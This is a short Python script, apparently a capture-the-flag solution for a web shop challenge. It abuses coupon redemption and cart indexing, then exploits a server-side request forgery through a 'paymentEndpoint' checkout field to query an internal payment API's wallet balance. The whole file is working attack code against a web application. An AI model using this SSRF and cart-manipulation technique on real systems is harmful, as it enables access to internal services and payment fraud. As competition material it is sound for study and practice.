#!/usr/bin/env python3
import requests
from lxml import html

s = requests.Session()

def p(endpoint, **kwargs):
    r = s.post("http://staywoke.hax1.allesctf.net" + endpoint, **kwargs)
    r.raise_for_status()
    return r.text

def ssr(url):
    s.post("http://staywoke.hax1.allesctf.net/products/2").raise_for_status()
    r = s.post("http://staywoke.hax1.allesctf.net/checkout", json={
        "payment": "w0kecoin",
        "paymentEndpoint": url,
        "account": "idc"
    })
    r.raise_for_status()

    return html.fromstring(r.text).xpath("//div[contains(@class, 'alert')]")[0].text.strip()


for _ in range(10):
    p("/products/2")
print(p("/api/redeem", json={
    "code": "I<3CORONA"
}))
for _ in range(10):
    p("/cart", json={"index": "0"})


p("/products/1")
print(p("/checkout", data={
    "payment": "w0kecoin",
    "paymentEndpoint": "http://payment-api:9090/wallets/1337-420-69-93dcbbcd/balance?",
    "account": "1337-420-69-93dcbbcd"
}))
